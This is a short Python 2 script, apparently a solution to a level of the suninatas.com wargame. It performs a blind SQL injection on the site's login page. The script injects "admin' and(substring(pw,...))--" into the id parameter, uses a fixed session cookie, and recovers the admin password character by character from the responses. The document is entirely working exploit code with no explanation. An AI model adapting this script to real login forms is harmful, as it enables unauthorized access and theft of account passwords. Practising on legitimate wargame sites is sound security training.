# -*- coding: utf8 -*-
 
import urllib, urllib2
import time
r=''
headers = {'Host': 'suninatas.com',
           'Cookie': 'ASPSESSIONIDSSSDDTCC=EHJGAGDDJCOBFCNMEIJLMODF;'
        }
 
string = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$^&*()-_+="
 
for i in range(0,12):
    for j in range(32,128):
        data = "?id="
        data = data + "admin' and(substring(pw,{},1)='{}')--".format(i, chr(j))
        data = data + "&pw=1"
        print data
        req = urllib2.Request("http://suninatas.com/Part_one/web22/web22.asp" + data, headers=headers)
        res = urllib2.urlopen(req).read() 
        if "<font size=4 color=blue>admin" in res:
             print chr(j)
             r+=chr(j)
             break
        time.sleep(0.1)
print r
